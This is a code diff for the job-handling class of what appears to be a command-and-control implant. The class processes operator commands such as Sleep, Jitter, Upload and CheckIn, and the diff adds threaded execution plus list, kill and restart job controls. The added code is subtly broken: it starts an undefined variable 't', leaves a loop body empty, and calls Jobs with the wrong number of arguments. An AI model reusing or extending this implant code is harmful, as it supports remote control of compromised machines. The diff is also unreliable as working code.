@@ -214,6 +214,7 @@ class STJob:
     private Job as JsonJob
     private Client as STClient
     private sw as Stopwatch = Stopwatch()
+    private _t as Thread
 
     public elapsedjobtime:
         get:
@@ -230,11 +231,18 @@ class STJob:
             print id, cmd
 
         if Job.args.run_in_thread:
-            Start.BeginInvoke(null, null)
+            _t as Thread = Thread() do:
+                Start()
+            t.Start()
         else:
             Start()
 
     /*
+        if Job.args.run_in_thread:
+            Start.BeginInvoke(null, null)
+        else:
+            Start()
+
         type = self.GetType()
         method as duck = type.GetMethod(Cmd).GetType()
         method.BeginInvoke(callback, null)
@@ -245,6 +253,11 @@ class STJob:
         print("callback: $(Start.EndInvoke(result)), elapsed: $(sw.Elapsed.Seconds), Started: $(StartTime), ended: $(EndTime)")
 
     */
+
+    public def Stop():
+        _t.Abort()
+        sw.Stop()
+        EndTime = DateTime.Now
 
     public def Start() as string:
         try:
@@ -258,6 +271,8 @@ class STJob:
                 result = Sleep(Job.args.args[0])  # I hate this shit, but for now it'll do
             elif cmd == 'Upload':
                 result = Upload(Job.args.args[0])
+            elif cmd == 'Jobs':
+                result = Jobs(Job.args.args[0])
             elif cmd == 'Jitter':
                 if len(Job.args.args) == 2:
                     result = Jitter(Job.args.args[0], Job.args.args[1])
@@ -271,6 +286,20 @@ class STJob:
         EndTime = DateTime.Now
 
         Client.SendJobResults(self)
+    
+    public def Jobs(command as string, jobId as string):
+        if command == 'list':
+            for job in Client.Job:
+
+        elif command == 'kill':
+            job = Client.Jobs.Find({j | return j.id == jobId})
+            if job:
+                job.Stop()
+
+        elif command == 'restart':
+            job = Client.Jobs.Find({j | return j.id == jobId})
+            if job:
+                job.Start()
 
     public def CheckIn() as Hash:
          return JavaScriptSerializer().Deserialize[of Hash](JavaScriptSerializer().Serialize(Client))
